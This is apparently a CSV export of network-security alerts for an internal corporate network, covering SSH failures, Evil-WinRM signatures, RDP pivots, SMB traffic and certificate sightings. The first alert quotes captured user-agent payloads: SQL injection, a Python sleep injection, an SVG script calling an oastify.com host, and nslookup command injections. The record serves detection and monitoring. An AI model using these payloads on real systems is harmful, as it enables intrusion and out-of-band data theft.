SEVERITY,ID,OCCURRED_AT,TYPE,DETECTION_QUADS,SUMMARY,CONTENT,DETECTION,ASSET_IDS,SOURCE_HOST_NAME,DESTINATION_HOST_NAME,SOURCE_IP,DESTINATION_IP,OTHER_IP,SOURCE,PACKET_CAPTURE_STATE
Low,32727,2025-03-28T10:28:34Z,Asset,Configuration,Detected 99 NewUserAgent between 2025-03-28T10:11:04.405Z and 2025-03-28T10:28:34.138Z,"Sample NewUserAgent values include:
  dst__port: ('',);
  uuid: d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a;
  src__mac: ;
  src_ip: 10.0.5.29, 10.0.7.30, 10.0.3.29, 10.0.10.30, 10.0.4.30, 10.0.9.12, 10.0.9.29, 10.0.5.30, 10.0.12.30;
  dst__mac: ;
  protocol: ;
  src_asset_id: 1905, 1704, 1709, 1910, 1936, 1919, 1729, 1854, 1914;
  dst__ip: ;
  src__port: ('',);
  user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and '1431'='1437, Microsoft BITS/7.8, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|nslookup -q=cname whhfxx2jaihwv5vs1umn2di8xz3srjff3aq0ep.oastify.com.&, eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single')), Microsoft-CryptoAPI/10.0, '""><svg/onload=fetch`//ke23ulz776ekstsgyijbz1fwun0go6cy2mx9nxc\.oastify.com`>, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'""`0&nslookup -q=cname hwh0cih4p3whaqadgf18hyxtckie64u1iw5mtb.oastify.com.&`', Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 9194=9196--, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36erros%>j8fd7'/""<ylbim, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 7859=7859--;
  src__ip: ;",User Agent First Seen,"1729,1854,1709,1919,1914,1910,1704,1905,1936",,,,,"10.0.9.29,10.0.9.12,10.0.3.29,10.0.10.30,10.0.7.30,10.0.12.30,10.0.5.29,10.0.4.30,10.0.5.30","d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a",
Low,32740,2025-03-28T09:19Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.10.30.,SSH Authentication Failure,"1919,2896",,,10.0.242.127,10.0.10.30,,de8959f5-202d-4e64-a5b1-0853fddeb9c5,
Low,32748,2025-03-28T08:53:31Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.10.30.,SSH Authentication Failure,"1919,2896",,,10.0.242.127,10.0.10.30,,922d492c-88cb-43d9-8e7d-7f31f136429b,
Medium,32806,2025-03-28T10:37:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1801,1919",,,10.0.10.30,10.0.10.29,,Network Traffic,
Medium,32808,2025-03-28T10:37:25Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1801,1919",,,10.0.10.30,10.0.10.29,,Network Traffic,
Medium,32814,2025-03-28T10:40:20Z,Indicator,Indicator,WinRM wsman Access,WinRM wsman Access,WinRM Signatures,"1919,1735",,,10.0.10.30,10.0.10.11,,Network Traffic,
Medium,32816,2025-03-28T10:40:20Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1919,1735",,,10.0.10.30,10.0.10.11,,Network Traffic,
Medium,32819,2025-03-28T10:40:30Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1735,1919",,,10.0.10.30,10.0.10.11,,Network Traffic,
Medium,32820,2025-03-28T10:40:55Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1919,1801",,,10.0.10.30,10.0.10.29,,Network Traffic,
Low,32827,2025-03-28T10:40:50Z,Communication,Configuration,Detected 6 NewSMBTraffic between 2025-03-28T10:33:27.605Z and 2025-03-28T10:40:50.630Z,"Sample NewSMBTraffic values include:
  dst__port: ('',);
  dst_asset_id: 1721, 1868, 1919, 1854, 1697, 135;
  uuid: cb825ada-bbcf-4219-ad75-057d7c55e487, acaf527d-4b97-43ad-b4ef-34fbc33e3e77, a6a8c16a-b366-42c3-8bd4-43c3050a4441, bbffa1db-60ab-4510-8b41-a5db113bc83e, 9920da0f-7331-4261-b8a4-db884e05fede, c5dd6e3e-2c81-43f1-87de-c043210a9bd5;
  src__mac: ;
  dst__mac: ;
  log_type: SMB_FileInfo, SMB_TreeInfo;
  protocol: ;
  versions: , SMB2, SMB1;
  src_asset_id: 48, 1910, 1801, 1729, 1933, 1704;
  dst__ip: ;
  src__port: ('',);
  src__ip: ;",New SMB Communication Detection,"48,1910,1801,1729,1933,1704,1721,1868,1919,1854,1697,135",,,"10.0.2.11,10.0.12.30,10.0.10.29,10.0.9.29,10.0.11.30,10.0.5.29","10.0.11.12,10.0.12.12,10.0.10.30,10.0.9.12,10.0.5.12,10.0.2.43",,"cb825ada-bbcf-4219-ad75-057d7c55e487, acaf527d-4b97-43ad-b4ef-34fbc33e3e77, a6a8c16a-b366-42c3-8bd4-43c3050a4441, bbffa1db-60ab-4510-8b41-a5db113bc83e, 9920da0f-7331-4261-b8a4-db884e05fede, c5dd6e3e-2c81-43f1-87de-c043210a9bd5",
Low,32859,2025-03-28T10:37:12Z,Communication,Indicator,Failed HTTP Logon,"Asset 1801 (10.0.10.29) returned an HTTP response code of 401 'Unauthorized' to asset 1919 (10.0.10.30), which represents a failed logon attempt via HTTP by asset 1919. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1801,1919",,,10.0.10.29,10.0.10.30,,87f75c02-61ed-4a93-bcd8-795b0286122d,
Low,32915,2025-03-28T10:31:28Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1919 (10.0.10.30) to then pivot to asset 1735 (10.0.10.11) via RDP.,Interactive Session Pivots,"2896,1735",,,10.0.242.127,10.0.10.11,,,
Low,32983,2025-03-28T10:49:14Z,Communication,Threat Behavior,RDP traffic to Server,Host 10.0.10.11 (1735) (Enterprise Management/Server) received RDP traffic from 10.0.10.30 (1919).,RDP to Enterprise Management Asset,"1919,1735",,,10.0.10.30,10.0.10.11,,24a3b533-e078-4c2c-ad52-ed0c94a5890c,
Low,33299,2025-03-28T10:08:44Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.10.30 (1919) to host 10.0.10.29 (1801). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid_ex), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1919,1801",,,10.0.10.30,10.0.10.29,,,
Low,33300,2025-03-28T10:08:45Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.10.30 (1919) to host 10.0.10.29 (1801). If unencrypted, may also include the RDP cookie (), selected protocol (rds_tls), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1919,1801",,,10.0.10.30,10.0.10.29,,,
Low,33301,2025-03-28T10:10:31Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.10.30 (1919) to host 10.0.10.29 (1801). If unencrypted, may also include the RDP cookie (nmap), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1919,1801",,,10.0.10.30,10.0.10.29,,,
Low,33462,2025-03-28T10:08:14Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.10.30 (1919) to host 10.0.10.11 (1735). If unencrypted, may also include the RDP cookie (), selected protocol (rds_tls), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1919,1735",,,10.0.10.30,10.0.10.11,,,
Low,33464,2025-03-28T10:08:15Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.10.30 (1919) to host 10.0.10.11 (1735). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1919,1735",,,10.0.10.30,10.0.10.11,,,
Low,33465,2025-03-28T10:08:09Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.10.30 (1919) to host 10.0.10.11 (1735). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid_ex), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1919,1735",,,10.0.10.30,10.0.10.11,,,
Low,33466,2025-03-28T10:08:08Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.10.11 (1735) to host 10.0.10.30 (1919). If unencrypted, may also include the RDP cookie (nmap), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1919,1735",,,10.0.10.11,10.0.10.30,,,
Low,33529,2025-03-28T10:49:45Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.10.30.,SSH Authentication Failure,"1919,2896",,,10.0.242.127,10.0.10.30,,8697d70c-f1a0-46e1-808c-4c049af5d339,
Low,33547,2025-03-28T09:19:27Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.10.30.,SSH Authentication Failure,"1919,2896",,,10.0.242.127,10.0.10.30,,0603e931-7e75-4490-92b4-60f1686e33a5,
Low,33552,2025-03-28T10:57:02Z,Communication,Configuration,Detected 12 RDP New Comms between 2025-03-28T10:42:07.274Z and 2025-03-28T10:57:02.611Z,"Sample RDP New Comms values include:
  rdp_client_name: ;
  dst__port: ('',);
  ip_src: 10.0.7.30, 10.0.2.44, 10.0.7.11, 10.0.10.11, 10.0.10.29, 10.0.7.44, 10.0.1.11, 10.0.2.30;
  dst_asset_id: 154, 1772, 1919, 1768, 1914, 143, 151;
  rdp_keyboard_layout: ;
  ip_dst: 10.0.7.30, 10.0.10.30, 10.0.1.30, 10.0.2.44, 10.0.7.11, 10.0.7.44, 10.0.2.30;
  rdp_selected_protocol: , hybrid, hybrid_ex;
  src__mac: ;
  dst__mac: ;
  protocol: ;
  src_asset_id: 45, 154, 1772, 1801, 1735, 1768, 1914, 143;
  dst__ip: ;
  src__port: ('',);
  rdp_rt_cookie: , plumber, jack, plumbet, administrator, alice, devel;
  src__ip: ;",RDP New Comms Pattern,"1914,1772,154,143,1919,1735,151,45,1768,1801",,,"10.0.7.30,10.0.7.11,10.0.2.30,10.0.2.44,10.0.10.11,10.0.1.11,10.0.7.44,10.0.10.29","10.0.7.30,10.0.7.11,10.0.2.30,10.0.2.44,10.0.10.30,10.0.1.30,10.0.7.44",,,
Medium,33553,2025-03-28T10:58:43Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1919,1801",,,10.0.10.30,10.0.10.29,,Network Traffic,
Low,33558,2025-03-28T10:53:50Z,Communication,Configuration,Detected 30 NewX509Certificate between 2025-03-28T10:39:33.023Z and 2025-03-28T10:53:50.707Z,"Sample NewX509Certificate values include:
  server: 20.190.160.132, 184.25.50.177, 40.126.31.67, 95.100.158.122, 95.100.158.115, 52.182.143.209, 23.3.89.96, 2.16.110.161, 10.0.3.11, 142.250.74.202;
  subject: , CN=DC1.PLUMETECH.LOCAL, C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=login.live.com, C=US, ST=WA, L=Redmond, O=Microsoft, OU=DSP, CN=*.prod.do.dsp.mp.microsoft.com, C=US, ST=WA, L=Redmond, O=Microsoft Corporation, CN=arc.msn.com;
  not_before: , 2025-03-04T20:39:31Z, 2025-03-27T01:24:33Z, 2025-03-16T00:00:00Z, 2025-03-09T16:45:25Z;
  server_asset_id: 1713, 3846, 3845, 3860, 3858, 3865, 3847, 357, 3853, 3850;
  dst__port: ('',);
  dns: ;
  uuid: e4f0d828-4c5a-4ff7-9eab-b822087a0ca7, 8adbaee7-db9d-4288-a47c-75c64cb3ebe5, 7649c6e2-8485-4e0b-8b92-ba4e37df1fa3, ab9d1caf-ac5a-4ca2-9c89-a358173237d2, b46ddac8-f7f7-42e5-9a78-364f0b7db769, 6cfee7ff-8ac1-4371-8cb6-5405bc62bf45, 18a22f55-7840-4767-9b0a-f4a22a84be64, 1ae19404-7899-44fa-aab8-9f8d0d2795cf, 1d6adc8f-e1ea-421e-a8f6-0a9b171519c1, 33862a12-346a-4b6f-aef2-fc24441fd3c3;
  issuer: , C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft ECC Content Distribution Secure Server CA 2.1, C=US, O=Microsoft Corporation, CN=Microsoft Azure RSA TLS Issuing CA 03, C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA, DC=LOCAL, DC=PLUMETECH, CN=PLUMETECH-DC1-CA;
  client_asset_id: 1896, 48, 1801, 1763, 1704, 1914;
  src__mac: ;
  not_after: , 2026-03-04T20:39:31Z, 2026-03-27T01:24:33Z, 2025-09-05T16:45:25Z, 2025-09-16T23:59:59Z;
  dst__mac: ;
  protocol: ;
  dst__ip: ;
  client: 10.0.7.30, 10.0.5.29, 10.0.4.29, 10.0.2.11, 10.0.10.29, 10.0.3.30;
  src__port: ('',);
  src__ip: ;",X509 Certificate First Seen,"48,1713,3846,3845,3860,3858,3865,3847,357,3853,3850,1896,1801,1763,1704,1914",,,"10.0.3.11,23.32.238.128,40.126.31.67,20.42.73.24,95.100.158.115,23.11.206.96,40.90.65.142,20.190.160.4,142.250.185.110,104.208.16.90","10.0.2.11,10.0.3.30,10.0.10.29,10.0.4.29,10.0.5.29,10.0.7.30",,"e4f0d828-4c5a-4ff7-9eab-b822087a0ca7, 8adbaee7-db9d-4288-a47c-75c64cb3ebe5, 7649c6e2-8485-4e0b-8b92-ba4e37df1fa3, ab9d1caf-ac5a-4ca2-9c89-a358173237d2, b46ddac8-f7f7-42e5-9a78-364f0b7db769, 6cfee7ff-8ac1-4371-8cb6-5405bc62bf45, 18a22f55-7840-4767-9b0a-f4a22a84be64, 1ae19404-7899-44fa-aab8-9f8d0d2795cf, 1d6adc8f-e1ea-421e-a8f6-0a9b171519c1, 33862a12-346a-4b6f-aef2-fc24441fd3c3",
Medium,33568,2025-03-28T11:00:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1801,1919",,,10.0.10.30,10.0.10.29,,Network Traffic,
Medium,33574,2025-03-28T11:01:59Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1801,1919",,,10.0.10.30,10.0.10.29,,Network Traffic,
Low,33582,2025-03-28T11:07:02Z,Communication,Indicator,DOM-2023-22 related indicator detected in environment,"One or more domain-type IOC indicators were observed matching on the DOM-2023-22 indicator value 'domain'. The IOC catalog unique ID for this indicator is Dragos::d910e396dddba24e2d42eca4be9f571958c2d9fd5a56afc79611988895498c30. The Dragos Intel Report with Serial: DOM-2023-22 is available, which contains in-depth technical details about the threat. The indicators were observed between [2025-03-28T10:11:14.334Z] and [2025-03-28T10:11:14.334Z].",Dragos Worldview IOC Catalog,1919,,,,,10.0.10.30,,
Low,33601,2025-03-28T11:08:39Z,Communication,Configuration,Detected 30 NewX509Certificate between 2025-03-28T10:55:27.659Z and 2025-03-28T11:08:39.919Z,"Sample NewX509Certificate values include:
  server: 2.19.198.58, 23.11.206.97, 23.11.206.105, 20.190.160.3, 20.190.160.20, 20.50.73.13, 50.116.1.184, 142.250.185.163, 13.69.109.131, 95.100.158.121;
  subject: , CN=DC1.PLUMETECH.LOCAL, CN=insecure.com, C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=login.live.com;
  not_before: , 2025-03-24T09:04:12Z, 2025-03-16T00:00:00Z, 2025-03-27T01:24:33Z, 2025-03-18T00:00:00Z;
  server_asset_id: 3893, 3896, 3872, 1832, 220, 3876, 3889, 3881, 2738, 3882;
  dst__port: ('',);
  dns: ;
  uuid: 412640da-7d6c-47f5-9f11-f20ecb1f8713, 3ab11504-8eb0-466e-8da8-3eadd87fa528, 3fb663b5-74dd-40e2-8896-ff313ab70421, 854740d7-b4a5-42b0-b1a4-5671c9f971d5, b5e9735b-af93-483d-98e7-e0fb420f513a, d16a1d2c-7831-45ad-ad75-d667d1a4b780, 87b0d1b5-e0c4-4511-8bd7-2f38e7b2528e, ddca6441-6417-4d61-9aeb-a68ea9b917a5, 8373ee8f-fa0f-4776-af5f-997d895413aa, 22022ffd-7693-45d9-8e6f-b2efd2e8527c;
  issuer: , DC=LOCAL, DC=PLUMETECH, CN=PLUMETECH-DC1-CA, C=US, O=Let's Encrypt, CN=R11, C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA;
  client_asset_id: 1905, 45, 48, 1746, 1801, 1919, 1933, 1914;
  src__mac: ;
  not_after: , 2025-06-22T09:04:11Z, 2026-03-27T01:24:33Z, 2025-09-16T23:59:59Z, 2025-09-18T23:59:59Z;
  dst__mac: ;
  protocol: ;
  dst__ip: ;
  client: 10.0.7.30, 10.0.6.29, 10.0.10.30, 10.0.4.30, 10.0.2.11, 10.0.10.29, 10.0.1.11, 10.0.11.30;
  src__port: ('',);
  src__ip: ;",X509 Certificate First Seen,"3893,3896,3872,3876,3881,3889,3882,45,1832,220,2738,1905,48,1746,1801,1919,1933,1914",,,"20.189.173.17,216.58.206.40,23.3.89.122,23.11.206.99,142.250.185.163,184.25.50.201,20.42.65.89,10.0.4.11,20.190.159.131,20.190.160.66","10.0.1.11,10.0.4.30,10.0.2.11,10.0.6.29,10.0.10.29,10.0.10.30,10.0.11.30,10.0.7.30",,"412640da-7d6c-47f5-9f11-f20ecb1f8713, 3ab11504-8eb0-466e-8da8-3eadd87fa528, 3fb663b5-74dd-40e2-8896-ff313ab70421, 854740d7-b4a5-42b0-b1a4-5671c9f971d5, b5e9735b-af93-483d-98e7-e0fb420f513a, d16a1d2c-7831-45ad-ad75-d667d1a4b780, 87b0d1b5-e0c4-4511-8bd7-2f38e7b2528e, ddca6441-6417-4d61-9aeb-a68ea9b917a5, 8373ee8f-fa0f-4776-af5f-997d895413aa, 22022ffd-7693-45d9-8e6f-b2efd2e8527c",
Low,33602,2025-03-28T11:10:25Z,Communication,Configuration,Detected 15 RDP New Comms between 2025-03-28T10:59:24.442Z and 2025-03-28T11:10:25.468Z,"Sample RDP New Comms values include:
  rdp_client_name: ;
  dst__port: ('',);
  ip_src: 10.0.10.12, 10.0.5.29, 10.0.1.29, 10.0.10.30, 10.0.1.43, 10.0.1.44, 10.0.7.44, 10.0.10.44, 10.0.1.11;
  dst_asset_id: 45, 118, 1936, 1807, 1919, 141, 44, 1914, 1800;
  rdp_keyboard_layout: ;
  ip_dst: 10.0.10.12, 10.0.7.30, 10.0.1.29, 10.0.10.30, 10.0.10.44, 10.0.1.43, 10.0.1.44, 10.0.1.11, 10.0.5.30;
  rdp_selected_protocol: , hybrid, hybrid_ex;
  src__mac: ;
  dst__mac: ;
  protocol: ;
  src_asset_id: 44, 118, 45, 1807, 1919, 141, 1704, 1768, 1800;
  dst__ip: ;
  src__port: ('',);
  rdp_rt_cookie: , plumber, jack, alice, devel;
  src__ip: ;",RDP New Comms Pattern,"45,118,1919,1914,44,1807,141,1704,1768,1800,1936",,,"10.0.1.11,10.0.1.43,10.0.10.30,10.0.1.29,10.0.10.44,10.0.1.44,10.0.5.29,10.0.7.44,10.0.10.12","10.0.1.11,10.0.1.43,10.0.10.30,10.0.7.30,10.0.1.29,10.0.10.44,10.0.1.44,10.0.10.12,10.0.5.30",,,
Low,33604,2025-03-28T11:03:51Z,Asset,Configuration,User-Agent First Seen from Host,"Asset 1801 made an HTTP request with User-Agent Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0 for the first time.",User Agent First Seen,1801,,,,,10.0.10.29,665b5f9b-906a-4f2d-8b1a-5a2de5a4de8f,
Low,33629,2025-03-28T11:00:39Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.10.60.,SSH Authentication Failure,"2896,1938",,,10.0.242.127,10.0.10.60,,22f26665-4aa0-4f6a-bd93-e68bfb66d0d4,
Low,33631,2025-03-28T11:00:27Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.10.30.,SSH Authentication Failure,"1919,2896",,,10.0.242.127,10.0.10.30,,a3edf620-fb50-456d-bea3-0706720d1451,
Low,33632,2025-03-28T10:59:30Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.10.30.,SSH Authentication Failure,"1919,2896",,,10.0.242.127,10.0.10.30,,b6a970ac-7b13-414e-a6e1-e80aee8c31d8,
Low,33637,2025-03-28T10:59:11Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.10.30.,SSH Authentication Failure,"1919,2896",,,10.0.242.127,10.0.10.30,,e81746d6-10ff-487b-bb5d-4e0865921334,
Low,33657,2025-03-28T10:48:31Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1919 (10.0.10.30) to then pivot to asset 1801 (10.0.10.29) via RDP.,Interactive Session Pivots,"2896,1801",,,10.0.242.127,10.0.10.29,,,
Low,33690,2025-03-28T11:23:32Z,Indicator,Indicator,DNS Query to Suspicious TLD .lol,DNS Query to Suspicious TLD .lol,Suspicious TLD Signatures,"69,1735",,,10.0.10.11,8.8.8.8,,Network Traffic,
Low,33691,2025-03-28T11:23:32Z,Indicator,Indicator,DNS Query to Suspicious TLD .lol,DNS Query to Suspicious TLD .lol,Suspicious TLD Signatures,"1735,1801",,,10.0.10.29,10.0.10.11,,Network Traffic,
Low,33715,2025-03-28T11:21:43Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1919 (10.0.10.30) to then pivot to asset 1801 (10.0.10.29) via RDP.,Interactive Session Pivots,"2896,1801",,,10.0.242.127,10.0.10.29,,,
Low,33745,2025-03-28T11:15:42Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.10.30.,SSH Authentication Failure,"2896,1919",,,10.0.242.127,10.0.10.30,,1373cc71-fca2-4386-8546-0e1054e43639,
Low,33747,2025-03-28T11:15:24Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.10.30.,SSH Authentication Failure,"2896,1919",,,10.0.242.127,10.0.10.30,,7fe4e0cf-2564-436b-8f33-2a2756b1dd60,
Low,33748,2025-03-28T11:14:18Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.10.30.,SSH Authentication Failure,"2896,1919",,,10.0.242.127,10.0.10.30,,5be59569-db84-4043-a6ba-009c14f7f231,
Low,33755,2025-03-28T11:19:23Z,Communication,Configuration,New SMB Communication detected,"New SMB_FileInfo (version: ['SMB1', 'SMB2']) traffic between Asset:1801 and Asset:1800",New SMB Communication Detection,"1801,1800",,,10.0.10.29,10.0.10.12,,e12101cc-646b-4a0d-a571-311633fb16d5,
Low,33757,2025-03-28T11:28:20Z,Communication,Configuration,New SMB Communication detected,New SMB_FileInfo (version: ) traffic between Asset:1801 and Asset:1800,New SMB Communication Detection,"1801,1800",,,10.0.10.29,10.0.10.12,,586e61d0-134c-4739-9064-d8be52aae8b6,
Low,33764,2025-03-28T11:23:59Z,Communication,Configuration,Detected 20 NewX509Certificate between 2025-03-28T11:09:16.198Z and 2025-03-28T11:23:59.659Z,"Sample NewX509Certificate values include:
  server: 23.3.89.123, 10.0.5.30, 142.250.181.227, 72.246.29.87, 74.125.99.39, 23.32.238.121, 23.3.110.134, 216.58.206.42, 20.189.173.16, 95.100.158.105;
  subject: ;
  not_before: ;
  server_asset_id: 3867, 3901, 3909, 3918, 3906, 3905, 3616, 3599, 3914, 69;
  dst__port: ('',);
  dns: ;
  uuid: 7432c24b-0c09-4e44-929a-40328d82b7e3, 83545665-1d98-43c7-8085-e5b11a5c2401, 9a72264f-0d20-4e2f-a692-d70bf4c52e18, 710b66c9-2f43-4c0c-885d-5c63013a0fbd, 3a45c965-2b70-4ba4-9838-7e6caf8f14f8, 56d8e41a-98a0-476f-936d-201b48087d9f, 2a4957bb-7372-4b18-8d99-3db50bc686ef, 6ac81012-da8c-424d-92ad-92719a2c8baa, 51a59060-f5b1-48fe-a57e-8dfc9c23de36, ff3f6581-6cb3-4635-9220-ef612b116d17;
  issuer: ;
  client_asset_id: 44, 1898, 1709, 1746, 1801, 1729, 1704, 1697, 1914;
  src__mac: ;
  not_after: ;
  dst__mac: ;
  protocol: ;
  dst__ip: ;
  client: 10.0.7.30, 10.0.6.29, 10.0.3.29, 10.0.5.29, 10.0.1.29, 10.0.6.30, 10.0.10.29, 10.0.9.29, 10.0.5.12;
  src__port: ('',);
  src__ip: ;",X509 Certificate First Seen,"3867,3901,3909,3918,3906,3905,3616,3599,3914,69,44,1898,1709,1746,1801,1729,1704,1697,1914",,,"23.32.238.121,23.3.89.106,23.3.110.134,95.216.74.145,72.246.29.87,13.89.178.26,142.250.181.227,216.58.206.42,20.189.173.23,8.8.8.8","10.0.1.29,10.0.6.30,10.0.3.29,10.0.6.29,10.0.10.29,10.0.9.29,10.0.5.29,10.0.5.12,10.0.7.30",,"7432c24b-0c09-4e44-929a-40328d82b7e3, 83545665-1d98-43c7-8085-e5b11a5c2401, 9a72264f-0d20-4e2f-a692-d70bf4c52e18, 710b66c9-2f43-4c0c-885d-5c63013a0fbd, 3a45c965-2b70-4ba4-9838-7e6caf8f14f8, 56d8e41a-98a0-476f-936d-201b48087d9f, 2a4957bb-7372-4b18-8d99-3db50bc686ef, 6ac81012-da8c-424d-92ad-92719a2c8baa, 51a59060-f5b1-48fe-a57e-8dfc9c23de36, ff3f6581-6cb3-4635-9220-ef612b116d17",
